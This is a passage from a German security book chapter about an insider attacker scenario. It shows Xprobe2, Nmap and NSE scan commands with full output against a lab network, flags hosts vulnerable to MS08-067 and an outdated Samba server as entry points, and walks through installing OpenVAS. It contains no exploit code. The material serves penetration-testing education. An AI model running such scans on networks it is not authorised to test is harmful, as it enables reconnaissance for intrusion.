OS: \"Microsoft Windows 2000 Workstation SP4\" (Guess probability: 100%) [+] Host 192.168.1.213 Running OS: \"Microsoft Windows 2000 Server\" (Guess probability: 100%) [+] Host 192.168.1.213 Running OS: \"Microsoft Windows 2000 Server Service Pack 1\" (Guess probability: 100%) (...) [+] Cleaning up scan engine [+] Modules deinitialized [+] Execution completed. root@discordia:~#\nDurch Xprobe2 erhalten wir ausf\u00fchrliche Informationen zu Hosts und zu den im Netzwerk verwendeten Betriebssystemen. So stuft Xprobe2 beispielsweise den Rechner 192.168.1.211 als Linux-Host ein, der unter dem Linux-Kernel 2.4 l\u00e4uft. Ist die Einsch\u00e4tzung von Xprobe2 korrekt, haben wir bei diesem Rechner bereits so gut wie einen Fu\u00df in der T\u00fcr: Wir erinnern uns daran, dass DSniff eine FTP-Sitzung abgefangen hat. Bei dem abgeh\u00f6rten Login scheint es sich zwar nur um einen FTP-User-Account zu handeln, oftmals ist dieser jedoch gekoppelt an weitere M\u00f6glichkeiten zum Zugriff auf das System.\n18.4 Scanning: \u00bbFull Contact\u00ab mit dem LAN\n435\n18.4.2 Nmap Der Security-Scanner Nmap ist einer der leistungsf\u00e4higsten Portscanner \u00fcberhaupt. Eine Schilderung s\u00e4mtlicher Funktionen von Nmap202 kann ganze B\u00fccher f\u00fcllen, folglich beschr\u00e4nken wir uns auch in diesem Szenario auf unser eigentliches Ziel und auf die dazu erforderlichen Handlungen: die Infiltration des Netzwerks. Zun\u00e4chst m\u00f6chten wir eine konkrete Vorstellung zur Gr\u00f6\u00dfe des Netzwerks erhalten \u2013 ein Ping Scan liefert uns eine \u00dcbersicht der aktiven Hosts samt MAC-Adressen: root@discordia:~# nmap -sP 192.168.1.0/24 Starting Nmap 5.20 ( http://nmap.org ) at 2010-02-13 15:10 CET Nmap scan report for endian.eschenweg.local (192.168.1.1) Host is up (0.0012s latency). MAC Address: 00:02:B3:8E:03:8A (Intel) Nmap scan report for 192.168.1.5 Host is up (0.0055s latency). MAC Address: 00:30:42:09:1F:7A (DeTeWe-Deutsche Telephonwerke) Nmap scan report for 192.168.1.10 Host is up (0.00033s latency). (...) Nmap scan report for 192.168.1.211 Host is up (0.00057s latency). MAC Address: 00:0C:29:16:7E:74 (VMware) Nmap scan report for 192.168.1.213 Host is up (0.00036s latency). MAC Address: 00:0C:29:37:79:26 (VMware) Nmap scan report for 192.168.1.214 Host is up (0.00025s latency). MAC Address: 00:0C:29:87:A3:13 (VMware) Nmap scan report for 192.168.1.215 Host is up (0.00056s latency). MAC Address: 00:0C:29:89:00:B7 (VMware) (...) Nmap scan report for 192.168.1.239 Host is up (0.0012s latency). MAC Address: 00:0C:29:B5:0D:F1 (VMware) Nmap scan report for 192.168.1.241 Host is up (0.00065s latency). MAC Address: 00:30:05:33:FF:4B (Fujitsu Siemens Computers) (...) Nmap done: 256 IP addresses (181 hosts up) scanned in 231.58 seconds root@discordia:~#\n202\nhttp://nmap.org/book/man.html\n436\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\nWir w\u00e4hlen sicherheitshalber einen SYN-Scan (Option -sS), bei dem ein TCP-Paket mit SYN-Flag an den Zielhost gesendet und ein Verbindungsversuch vorget\u00e4uscht wird. Die Antwort des Hosts gibt Aufschluss \u00fcber den Port: Schickt der Host ein SYN/ACK-Paket, akzeptiert der Port unsere Verbindung und ist folglich offen. Sendet der Host ein RSTPaket zur\u00fcck, ist der Port geschlossen. Vermeldet der Zielhost \u00fcberhaupt kein Paket, ist m\u00f6glicherweise ein Paketfilter vorgeschaltet. Der Vorteil beim SYN-Scan ist, dass der penetrierte Dienst keinen korrekten Verbindungsversuch wahrnimmt und viele Systeme somit keinen Eintrag im Logfile verzeichnen. Zudem beauftragten wir Nmap damit, das Betriebssystem (OS-Detection) und den Versionsstand der verwendeten Dienste des Remote-Hosts zu ergr\u00fcnden (Option \u2013O und A). Die Hosterkennung (Host Discovery), die Nmap grunds\u00e4tzlich vor jedem Scan durchf\u00fchrt, um den Host auf Erreichbarkeit zu pr\u00fcfen, schalten wir mit -P0 ab. Wir m\u00f6chten damit verhindern, dass ein Host, den Nmap vielleicht f\u00e4lschlicherweise als offline einstuft, vom Scanning ausgeschlossen wird. Die interessantesten R\u00fcckmeldungen von Nmap anbei: root@discordia:~# nmap -sS -A -O -P0 192.168.1.0/24 Starting Nmap 5.20 ( http://nmap.org ) at 2010-02-13 15:10 CET (...) Nmap scan report for 192.168.1.5 Host is up (0.00027s latency). Not shown: 994 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp 23/tcp open telnet Linux telnetd 80/tcp open http Apache httpd | html-title: 302 Found |_Did not follow redirect to https://192.168.1.5/ 443/tcp open ssl/http Apache httpd |_html-title: KX-TD1232 for Enterprise |_sslv2: server still supports SSLv2 514/tcp open tcpwrapped 9090/tcp open zeus-admin? 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi : SF-Port21-TCP:V=5.20%I=7%D=2/9%Time=4B718301%P=i686-pc-linux-gnu%r(NULL,23 SF:,\"220\\x20xa000000\\x20FTP\\x20server\\x20\\(\\)\\x20ready\\.\\r\\n\")%r(GenericLi SF:nes,6F,\"220\\x20xa000000\\x20FTP\\x20server\\x20\\(\\)\\x20ready\\.\\r\\n530\\x20P SF:lease\\x20login\\x20with\\x20USER\\x20and\\x20PASS\\.\\r\\n530\\x20Please\\x20log SF:in\\x20with\\x20USER\\x20and\\x20PASS\\.\\r\\n\")%r(Help,49,\"220\\x20xa000000\\x2 SF:0FTP\\x20server\\x20\\(\\)\\x20ready\\.\\r\\n530\\x20Please\\x20login\\x20with\\x20 SF:USER\\x20and\\x20PASS\\.\\r\\n\")%r(SMBProgNeg,23,\"220\\x20xa000000\\x20FTP\\x20 SF:server\\x20\\(\\)\\x20ready\\.\\r\\n\");\n18.4 Scanning: \u00bbFull Contact\u00ab mit dem LAN\n437\nMAC Address: 00:40:22:07:1C:7A (Panasonic Operating Company) No exact OS matches for host (If you know what OS is running on it, see http://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=5.21%D=2/9%OT=21%CT=1%CU=31994%PV=Y%DS=1%DC=D%G=Y%M=00809F%TM=4B7 OS:1839B%P=i686-pc-linux-gnu)SEQ(SP=C1%GCD=1%ISR=C5%TI=Z%CI=Z%II=I%TS=U)SEQ OS:(SP=C1%GCD=2%ISR=C5%TI=Z%CI=Z%II=I%TS=U)OPS(O1=M5B4NNSNW0%O2=M5B4NNSNW0% OS:O3=M5B4NW0%O4=M5B4NNSNW0%O5=M5B4NNSNW0%O6=M5B4NNS)WIN(W1=16D0%W2=16D0%W3 OS:=16D0%W4=16D0%W5=16D0%W6=16D0)ECN(R=Y%DF=Y%T=40%W=16D0%O=M5B4NNSNW0%CC=N OS:%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=16D OS:0%S=O%A=S+%F=AS%O=O5B4NNSNW0%RD=0%Q=)T4(R=Y%DF=Y%T=FF%W=0%S=A%A=Z%F=R%O= OS:%RD=0%Q=)T5(R=Y%DF=Y%T=FF%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=FF% OS:W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=FF%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q= OS:)U1(R=Y%DF=N%T=AA%IPL=165%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y% OS:DFI=N%T=FF%CD=S) Network Distance: 1 hop Service Info: OS: Linux HOP RTT ADDRESS 1 0.27 ms 192.168.168.9 (...) Nmap scan report for 192.168.1.211 Host is up (0.00075s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp ProFTPD 1.3.1 22/tcp open ssh OpenSSH 5.1p1 Debian 5 (protocol 2.0) | ssh-hostkey: 1024 d1:0e:f0:1f:4b:24:94:9d:c1:b7:82:1a:6e:39:8c:1d (DSA) |_2048 b7:ea:f0:a6:d7:83:61:75:5b:55:f3:b2:f8:59:17:48 (RSA) 111/tcp open rpcbind 2 (rpc #100000) | rpcinfo: | 100000 2 111/udp rpcbind | 100024 1 34926/udp status | 100000 2 111/tcp rpcbind |_100024 1 40740/tcp status MAC Address: 00:0C:29:16:7E:74 (VMware) Device type: general purpose Running: Linux 2.6.X OS details: Linux 2.6.13 \u2013 2.6.28 Network Distance: 1 hop Service Info: OSs: Unix, Linux\n438\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\nHOP RTT\nADDRESS\n1 0.75 ms 192.168.1.211 (...) Nmap scan report for 192.168.1.213 Host is up (0.00078s latency). Not shown: 994 closed ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 6.0 |_html-title: 1984 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn 445/tcp open microsoft-ds Microsoft Windows 2003 or 2008 microsoft-ds 1025/tcp open msrpc Microsoft Windows RPC 1026/tcp open msrpc Microsoft Windows RPC MAC Address: 00:0C:29:37:79:26 (VMware) Device type: general purpose Running: Microsoft Windows 2003 OS details: Microsoft Windows Server 2003 SP1 or SP2 Network Distance: 1 hop Service Info: OS: Windows Host script results: |_nbstat: NetBIOS name: INTRANET, NetBIOS user: , NetBIOS MAC: 00:0c:29:37:79:26 |_smbv2-enabled: Server doesn't support SMBv2 protocol | smb-os-discovery: | OS: Windows Server 2003 3790 Service Pack 1 (Windows Server 2003 5.2) | Name: DISCORDIAWERKE\\INTRANET |_ System time: 2010-02-13 14:33:31 UTC+1 HOP RTT ADDRESS 1 0.78 ms 192.168.1.213 (...) Nmap scan report for 192.168.1.216 Host is up (0.00078s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn 445/tcp open microsoft-ds Microsoft Windows 2003 or 2008 microsoft-ds 1025/tcp open msrpc Microsoft Windows RPC\n18.4 Scanning: \u00bbFull Contact\u00ab mit dem LAN\n439\nMAC Address: 00:0C:29:16:A2:65 (VMware) Device type: general purpose Running: Microsoft Windows 2003 OS details: Microsoft Windows Server 2003 SP1 or SP2 Network Distance: 1 hop Service Info: OS: Windows Host script results: |_nbstat: NetBIOS name: FILESERVER, NetBIOS user: , NetBIOS MAC: 00:0c:29:16:a2:65 | smb-os-discovery: | OS: Windows Server 2003 3790 Service Pack 2 (Windows Server 2003 5.2) | Name: DISCORDIAWERKE\\FILESERVER |_ System time: 2010-02-13 14:33:30 UTC+1 |_smbv2-enabled: Server doesn't support SMBv2 protocol HOP RTT ADDRESS 1 0.78 ms 192.168.1.216 (...) Nmap scan report for 192.168.1.220 Host is up (0.00055s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 3.8.1p1 Debian 8.sarge.4 (protocol 2.0) | ssh-hostkey: 1024 eb:4f:f2:7e:60:81:94:19:62:8c:51:ab:7d:f3:23:e6 (DSA) |_1024 92:ae:0d:a9:38:b0:85:d0:b0:b2:15:22:7d:64:2d:72 (RSA) 139/tcp open netbios-ssn Samba smbd 3.X (workgroup: DISCORDIAWERKE) 445/tcp open netbios-ssn Samba smbd 3.X (workgroup: DISCORDIAWERKE) MAC Address: 00:0C:29:4F:94:0F (VMware) Device type: general purpose Running: Ubiquiti Linux 2.4.X OS details: Ubiquiti AirOS 3.4 (Linux 2.4.24 \u2013 2.4.27) Network Distance: 1 hop Service Info: OS: Linux Host script results: |_nbstat: NetBIOS name: SAMBA, NetBIOS user: , NetBIOS MAC: | smb-os-discovery: | OS: Unix (Samba 3.0.14a-Debian) | Name: DISCORDIAWERKE\\Unknown |_ System time: 2010-02-13 13:34:32 UTC+1\n440\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\nHOP RTT\nADDRESS\n1 0.55 ms 192.168.1.220 (...) Nmap scan report for 192.168.1.227 Host is up (0.00022s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn 5800/tcp open vnc-http RealVNC 4.0 (Resolution 400x250; VNC TCP port: 5900) 5900/tcp open vnc VNC (protocol 3.8) MAC Address: 00:30:05:33:FF:4B (Fujitsu Siemens Computers) Device type: general purpose Running: Microsoft Windows XP OS details: Microsoft Windows XP SP2 or SP3, or Windows Server 2003 Network Distance: 1 hop Service Info: OS: Windows HOP RTT ADDRESS 1 0.22 ms 192.168.1.227 (...) OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ . Nmap done: 256 IP addresses (181 hosts up) scanned in 2371.39 seconds root@discordia:~#\nNmap wird seinem guten, vorauseilenden Ruf gerecht. Wir erhalten eine l\u00fcckenlose Darstellung der im Netzwerk befindlichen Rechner, einschlie\u00dflich aller angebotenen Dienste. Bereits jetzt k\u00f6nnen wir aus Erfahrung sagen, dass nicht nur die Betriebssysteme einiger Rechner, sondern auch diverse der betriebenen Dienste entweder \u00bboutdated\u00ab (zum Beispiel der SAMBA-Server) oder schlichtweg unsicher sind (zum Beispiel FTP- und VNC-Verbindungen). Ein echtes Bonbon von Nmap stellt die Nmap Scripting Engine (NSE) dar. Durch die m\u00e4chtige und flexible NSE k\u00f6nnen Benutzer einfache Skripte schreiben, um eine breite Palette von Netzwerkaufgaben zu automatisieren.\n18.4 Scanning: \u00bbFull Contact\u00ab mit dem LAN\n441\nDie explizite Suche nach Windows-Rechnern, die nicht vom Patch MS08-067 partizipierten und somit f\u00fcr den Conficker-Wurm203 anf\u00e4llig oder m\u00f6glicherweise bereits damit infiziert sind, gestaltet sich beispielsweise wie folgt: root@discordia:~# nmap -p137,139,445 --script p2p-conficker,smb-osdiscovery,smb-check-vulns --script-args checkconficker=1,unsafe=1 192.168.1.0/24 Starting Nmap 5.20 ( http://nmap.org ) at 2010-02-13 15:16 CET NSE: Starting runlevel 2 (of 2) scan. NSE: Script Scanning completed. (...) Nmap scan report for 192.168.1.213 Host is up (0.00077s latency). PORT STATE SERVICE 137/tcp closed netbios-ns 139/tcp open netbios-ssn 445/tcp open microsoft-ds MAC Address: 00:0C:29:37:79:26 (VMware) Host script results: | smb-os-discovery: | OS: Windows Server 2003 3790 Service Pack 1 (Windows Server 2003 5.2) | Name: DISCORDIAWERKE\\INTRANET |_ System time: 2010-02-13 14:37:24 UTC+1 | smb-check-vulns: | MS08-067: VULNERABLE | Conficker: Likely CLEAN | |_ SMBv2 DoS (CVE-2009-3103): NOT VULNERABLE (...) Nmap scan report for 192.168.1.216 Host is up (0.00046s latency). PORT STATE SERVICE 137/tcp closed netbios-ns 139/tcp open netbios-ssn 445/tcp open microsoft-ds MAC Address: 00:0C:29:16:A2:65 (VMware)\n203\nhttp://technet.microsoft.com/de-de/security/dd452420.aspx\n442\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\nHost script results: | smb-os-discovery: | OS: Windows Server 2003 3790 Service Pack 2 (Windows Server 2003 5.2) | Name: DISCORDIAWERKE\\FILESERVER |_ System time: 2010-02-13 14:37:24 UTC+1 | smb-check-vulns: | MS08-067: NOT VULNERABLE | Conficker: Likely CLEAN | |_ SMBv2 DoS (CVE-2009-3103): NOT VULNERABLE (...) Nmap scan report for 192.168.1.227 Host is up (0.00064s latency). PORT STATE SERVICE 137/tcp closed netbios-ns 139/tcp open netbios-ssn 445/tcp closed microsoft-ds MAC Address: 00:30:05:33:FF:4B (Fujitsu Siemens Computers) Host script results: | smb-check-vulns: | | Conficker: UNKNOWN; got error SMB: Couldn't find a NetBIOS name that works for the server. Sorry! | |_ SMBv2 DoS (CVE-2009-3103): VULNERABLE (...) Nmap done: 256 IP addresses (179 hosts up) scanned in 2418.88 seconds root@discordia:~#\nDurch die Meldung \u00bbMS08-067: VULNERABLE\u00ab wird uns unweigerlich klar, dass der Webserver unter Windows Server 2003 mit der IP-Adresse 192.168.1.213 und dem NetBIOS-Namen \u00bbINTRANET\u00ab anf\u00e4llig f\u00fcr besagte Schw\u00e4che zu sein scheint. Ein leichtes Spiel f\u00fcr einen Netzwerkforscher mit kriminellen Absichten. Neben zahlreichen Neuerungen wie der stark \u00fcberarbeiteten Scripting Engine NSE gesellen sich noch weitere Neuank\u00f6mmlinge der Nmap-Familie hinzu. So gibt es neben ndiff und ncat auch zenmap, welches das bisherige Frontend nmapFE abl\u00f6st. Die zenmap-Oberfl\u00e4che, die unter anderem eine Sortierung der \u00dcbersicht nach Hosts und Diensten vermag, liefert in unserem Szenario ein Ergebnis wie das folgende:\n18.4 Scanning: \u00bbFull Contact\u00ab mit dem LAN\n443\nBild 18.17: Durch zenmap wird eine neue Form des Reporting erreicht\n18.4.3 Open Vulnerability Assessment System / OpenVAS Das Scanning per Nmap liefert versierten Netzwerkforschern grunds\u00e4tzlich alles, was sie f\u00fcr das weitere Vorgehen ben\u00f6tigen. Von besonderem Wert ist die Tatsache, dass die \u00bbBlack Box\u00ab des unbekannten Netzwerks ein Gesicht erh\u00e4lt und uns so die M\u00f6glichkeit zur Selektion bietet. So best\u00e4tigt sich auch unsere Vermutung, dass es sich bei dem Rechner mit der IP-Adresse 192.168.1.211 um ein Linux-System handelt, welches sowohl einen FTP- als auch einen SSH-Dienst anbietet. Durch die Option Service and Application Version Detection haben wir dar\u00fcber hinaus erfahren, dass auf dem Rechner 192.168.1.220 ein veralteter Samba-Server in der Version 3.0.14a eingesetzt wird. Regelm\u00e4\u00dfige Leser von Mailinglisten wie Bugtraq204 werden sich daran erinnern, dass diese Version einige Schw\u00e4chen205 beinhaltet, die durch Exploits ausgenutzt werden k\u00f6nnen. Ferner konnte durch NSE festgestellt werden, dass der Server mit der IP-Adresse 192.168.1.213 anf\u00e4llig ist f\u00fcr MS08-067. Beides sind willkommene Einstiegsluken. Wer sein Wissen \u00fcber Schwachstellen erst noch aufbauen oder erweitern m\u00f6chte (die Zuordnung fehlerhafter Dienste zum aktuellen Zeitpunkt somit noch nicht selbst vornehmen kann), GUIs und verst\u00e4ndliche Reports bevorzugt, findet im freien OpenVAS einen Freund. OpenVAS \u00fcbertrifft mit seinem Umfang klassische Vulnerability-Scanner, die ein System ausschlie\u00dflich auf Schwachstellen pr\u00fcfen und mit ausf\u00fchrlichem Reporting auf erforderliche Verbesserungen hinweisen \u2013 auch wenn dieses Merkmal f\u00fcr unser Szenario bereits ausreichen w\u00fcrde. 204\nhttp://www.securityfocus.com/archive/1\n205\nhttp://www.securityfocus.com/bid/38111/info\n444\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\nSo stellt OpenVAS nicht nur eine umfassende Sammlung von Werkzeugen f\u00fcr die Sicherheitsanalyse in Netzwerken zur Verf\u00fcgung, sondern integriert zus\u00e4tzlich eine Vielzahl von weiteren Sicherheitsanwendungen. Zudem bietet das Tool eine grafische Benutzeroberfl\u00e4che. Neben der Verzahnung mit verinice206, einem ISMS-Tool f\u00fcr das Management von Informationssicherheit zur ISO 27001 auf der Basis von BSI ITGrundschutz, ist OpenVAS durch die Funktion \u00bbLocal Access Credentials\u00ab in der Lage, auch Schwachstellen aus der Innensicht eines Scanziels zu erkunden. Dazu greift es per SSH oder SMB auf das Zielsystem zu und pr\u00fcft Anwendungszust\u00e4nde, die von au\u00dfen nicht erkennbar sind, wie etwa den Patchstand von Anwendungen oder die Komplexit\u00e4t der lokalen Kennw\u00f6rter. Das Herzst\u00fcck des Open Vulnerability Assessment System bildet eine Serverkomponente, die eine Sammlung von Network Vulnerability Tests (NVT) nutzt, um Sicherheitsprobleme in Netzwerksystem und -anwendungen aufzusp\u00fcren. OpenVAS hat seine Wurzeln im zwischenzeitlich propriet\u00e4r gewordenen Vulnerability Scanner Nessus207, den wir in der Erstausgabe dieses Buches vorgestellt hatten. Seit der Abspaltung von Nessus wurde OpenVAS eigenst\u00e4ndig weiterentwickelt und durch optional erh\u00e4ltliche Enterprise-Funktionen erweitert wie beispielsweise dem Greenbone Security Feed208 oder dem Greenbone Security Manager (GSM)209. Zur erfolgreichen Einbindung des OpenVAS-Scanners in der aktuellen Version 3.0.1 auf einem Debian-System bedarf es kleinerer Installationsvorarbeiten: root@discordia:~# aptitude install build-essential libgtk2.0-dev libglib2.0-dev libssl-dev htmldoc libgnutls-dev libpcap0.8-dev bison libgpgme11-dev libsmbclient-dev snmp pnscan cmake\nNachfolgend beschaffen wir uns die essenziellen Pakete in Form der Libraries und des Scanners. Den Client binden wir zu einem sp\u00e4teren Zeitpunkt ein. root@discordia:~# wget http://wald.intevation.org/frs/download.php/706/openvas-libraries3.0.3.tar.gz root@discordia:~# wget http://wald.intevation.org/frs/download.php/696/openvas-scanner3.0.1.tar.gz root@discordia:~# wget http://wald.intevation.org/frs/download.php/685/openvas-client-3.0.0.tar.gz\n206\nhttp://v.de\n207\nhttp://www.nessus.org/nessus\n208\nhttp://greenbone.net/solutions/gbn_feed.de.html\n209\nhttp://greenbone.net/solutions/gbn_manager.de.html\n18.4 Scanning: \u00bbFull Contact\u00ab mit dem LAN\n445\nNach vollendetem Transfer erfolgt das Entpacken der Tarballs: root@discordia:~# tar xvfz openvas-libraries-3.0.3.tar.gz root@discordia:~# tar xvfz openvas-scanner-3.0.1.tar.gz root@discordia:~# tar xvfz openvas-client-3.0.0.tar.gz\nDie Installation der OpenVAS-Libraries erfolgt im \u00fcblichen Linux-Dreischritt... root@discordia:~# cd openvas-libraries-3.0.3 root@discordia:~/openvas-libraries-3.0.3# ./configure root@discordia:~/openvas-libraries-3.0.3# make root@discordia:~/openvas-libraries-3.0.3# make install root@discordia:~/openvas-libraries-3.0.3# ldconfig\n...beim OpenVAS-Scanner-D\u00e4mon verh\u00e4lt es sich \u00e4hnlich... root@discordia:~# cd openvas-scanner-3.0.1 root@discordia:~/openvas-scanner-3.0.1# ./configure root@discordia:~/openvas-scanner-3.0.1# make root@discordia:~/openvas-scanner-3.0.1# make install\n...und wer h\u00e4tte es gedacht: Auch der OpenVAS-Client zeigt sich beim Kompilieren best\u00e4ndig: root@discordia:~# cd openvas-client-3.0.0 root@discordia:~/openvas-client-3.0.0# ./configure root@discordia:~/openvas-client-3.0.0# make root@discordia:~/openvas-client-3.0.0# make install (...) -------------------------------------------------------------OpenVAS-Client has been successfully installed. -------------------------------------------------------------root@discordia:~/openvas-client-3.0.0#\nSollen Scanner und Client auf voneinander unabh\u00e4ngigen Systemen betrieben werden (eine sicherlich weitverbreitete Form, gerade in Unternehmen), sind auf der Serverseite sowohl Libraries als auch Scanner, auf der Clientseite Libraries und Client einzubinden. Die Erfordernis zur Installation des OpenVAS-Clients wird mit zunehmender Entwicklung des Greenbone Security Assistant210 allerdings entfallen, stellt dieser doch ein leistungsf\u00e4higes Web-Frontend f\u00fcr den OpenVAS-Scanner-D\u00e4mon dar.\n210\nhttp://wald.intevation.org/projects/openvas\n446\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\nNach der Installation s\u00e4mtlicher Pakete sind noch abschlie\u00dfende Schritte erforderlich, um OpenVAS effektiv nutzen zu k\u00f6nnen: So m\u00fcssen zun\u00e4chst Zertifikate f\u00fcr den Server erstellt sowie Benutzer angelegt werden, bevor eine Kommunikation aufgebaut werden kann. Am einfachsten geht die Erstellung eines Zertifikats mit dem im OpenVAS-Servermodul enthaltenen Skript openvas-mkcert. Das Skript erstellt zwei Zertifikate: ein Zertifikat f\u00fcr eine lokale Zertifizierungsstelle (CA) und ein zweites Zertifikat f\u00fcr den OpenVAS-Server, das von der CA signiert ist und beim Verbindungsaufbau \u00fcbermittelt wird. root@discordia:~# openvas-mkcert --------------------------------------------------------------------------Creation of the OpenVAS SSL Certificate --------------------------------------------------------------------------This script will now ask you the relevant information to create the SSL certificate of OpenVAS. Note that this information will *NOT* be sent to anybody (everything stays local), but anyone with the ability to connect to your OpenVAS daemon will be able to retrieve this information.\nCA certificate life time in days [1460]:1460 Server certificate life time in days [365]:365 Your country (two letter code) [DE]:DE Your state or province name [none]: Your location (e.g. town) [Berlin]: Bielefeld Your organization [OpenVAS Users United]: OWNZ INC. --------------------------------------------------------------------------Creation of the OpenVAS SSL Certificate --------------------------------------------------------------------------Congratulations. Your server certificate was properly created. /usr/local/etc/openvas/openvassd.conf updated The following files were created: . Certification authority: Certificate = /usr/local/var/lib/openvas/CA/cacert.pem Private key = /usr/local/var/lib/openvas/private/CA/cakey.pem . OpenVAS Server : Certificate = /usr/local/var/lib/openvas/CA/servercert.pem Private key = /usr/local/var/lib/openvas/private/CA/serverkey.pem Press [ENTER] to exit root@discordia:~#\n18.4 Scanning: \u00bbFull Contact\u00ab mit dem LAN\n447\nDie Einbindung neuer User erfolgt mit openvas-adduser: root@discordia:~# openvas-adduser Using /var/tmp as a temporary file holder. Add a new openvassd user ---------------------------------\nLogin : openvas-user Authentication (pass/cert) [pass] : pass Login password : ******************* Login password (again) : ******************* User rules --------------openvassd has a rules system which allows you to restrict the hosts that openvas-user has the right to test. For instance, you may want him to be able to scan his own host only. Please see the openvas-adduser(8) man page for the rules syntax. Enter the rules for this user, and hit ctrl-D once you are done: (the user can have an empty rules set)\nLogin Password\n: openvas-user : *******************\nRules\n:\nIs that ok? (y/n) [y] y user added. root@discordia:~#\nVor jedem Scanning empfiehlt sich die Synchronisation der eigenen NVT-Sammlung mit einem OpenVAS NVT-Feed, um sicherzustellen, dass der jeweils aktuellste Feed verwendet wird. Das OpenVAS-Projekt beschert uns freundlicherweise einen voreingestellten NVT Feed Service211, der mit dem Synchronisationsskript openvas-nvt-sync aufgerufen wird und per Rsync oder Wget die neuesten Plugins herunterl\u00e4dt:\n211\nrsync://rsync.openvas.org:/nvt-feed\n448\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\nroot@discordia:~# openvas-nvt-sync OpenVAS NVT Sync 3.0.1 [i] NVT dir: /usr/local/lib/openvas/plugins [i] This script synchronizes an NVT collection with the 'OpenVAS NVT Feed'. [i] The 'OpenVAS NVT Feed' is provided by 'The OpenVAS Project'. [i] Online information about this feed: 'http://www.openvas.org/openvasnvt-feed.html'. [w] rsync not found! /usr/local/sbin/openvas-nvt-sync: line 217: [: missing ']' [i] Will use wget [i] Using GNU wget: /usr/bin/wget [i] Configured NVT http feed: http://www.openvas.org/openvas-nvt-feedcurrent.tar.bz2 [i] Downloading to: /tmp/openvas-feed-2010-02-13-6498.tar.bz2 --2010-02-13 17:24:20-- http://www.openvas.org/openvas-nvt-feedcurrent.tar.bz2 Aufl\u00f6sen des Hostnamen \"www.openvas.org\".... 78.47.251.62 Verbindungsaufbau zu www.openvas.org|78.47.251.62|:80... verbunden. HTTP Anforderung gesendet, warte auf Antwort... 200 OK L\u00e4nge: 6051009 (5,8M) [application/x-tar] In \"/tmp/openvas-feed-2010-02-13-6498.tar.bz2\" speichern. 100%[====================================================================== =========================================================================== ================>] 6.051.009 635K/s in 9,4s 2010-02-13 17:24:30 (630 KB/s) \u2013 \"/tmp/openvas-feed-2010-02-136498.tar.bz2\" gespeichert [6051009/6051009] 12planet_chat_server_xss.nasl 12planet_chat_server_xss.nasl.asc 3com_nbx_voip_netset_detection.nasl 3com_nbx_voip_netset_detection.nasl.asc 3com_switches.nasl 3com_switches.nasl.asc (...) zyxel_http_pwd.nasl.asc zyxel_pwd.nasl zyxel_pwd.nasl.asc [i] Download complete [i] Checking dir: ok [i] Checking MD5 checksum: ok root@discordia:~#\n18.4 Scanning: \u00bbFull Contact\u00ab mit dem LAN\n449\nDer Start des OpenVAS-Scanner-D\u00e4mons erfolgt durch die Eingabe von openvassd. Zun\u00e4chst werden s\u00e4mtliche Plugins eingebunden, anschlie\u00dfend l\u00e4sst sich der Dienst durch den Client \u00bbOpenVAS-Client\u00ab ansprechen. root@discordia:~# openvassd All plugins loaded root@discordia:~#\nDer Scanvorgang ist denkbar einfach: Nach erfolgtem Login, der Angabe der IP-Adressen \u2013 oder beispielsweise einer ganzen Netzwerkrange \u2013 der zu \u00fcberpr\u00fcfenden Systeme m\u00fcssen wir nur noch festlegen, welche Plugins beim Scannen verwendet werden sollen. Ein unbedarfter B\u00f6sewicht w\u00e4hlt hier oftmals alles, was OpenVAS zu bieten hat. Die Autoren m\u00f6chten dennoch daf\u00fcr sensibilisieren, in solch einem Fall zumindest auf die Anwendung des Safe-Checks zu achten. Die Option \u00bbSafe-Checks\u00ab weist OpenVAS an, sich haupts\u00e4chlich auf Banner von Diensten zu verlassen, statt m\u00f6glicherweise invasive Tests durchzuf\u00fchren, die im schlimmsten Fall einen Dienst zum Absturz bringen oder Ressourcen beanspruchen. Dies f\u00fchrt zwar zu einem weniger zuverl\u00e4ssigen Bericht, macht aber eine Einschr\u00e4nkung der Funktionalit\u00e4t des Zielrechners w\u00e4hrend des Scanvorgangs weniger wahrscheinlich \u2013 was f\u00fcr eine Infiltration ohnehin h\u00f6chst kontraproduktiv w\u00e4re. Nach Abschluss des Scanvorgangs liefert uns OpenVAS einen Report in verschiedenen Formaten (HTML, XLM und PDF), einschlie\u00dflich einer Beschreibung der Schwachstelle und hilfreichen Informationen zu CVSS-Quellen. OpenVAS, angesetzt auf einen der von uns n\u00e4her in Augenschein genommenen Rechner, liefert folgendes Ergebnis:\nBild 18.18: OpenVAS mit entdeckten Schwachstellen im Samba-Dienst\nDurch L\u00f6sungen wie OpenVAS kann selbst ein unbedarfter Nutzer entdecken, welche Systeme in Schieflage geraten sind und netzwerkseitig \u00bbangeschossen\u00ab werden k\u00f6nnen. Bei derartigen Rechnern handelt es sich um tickende Zeitbomben, die eigentlich 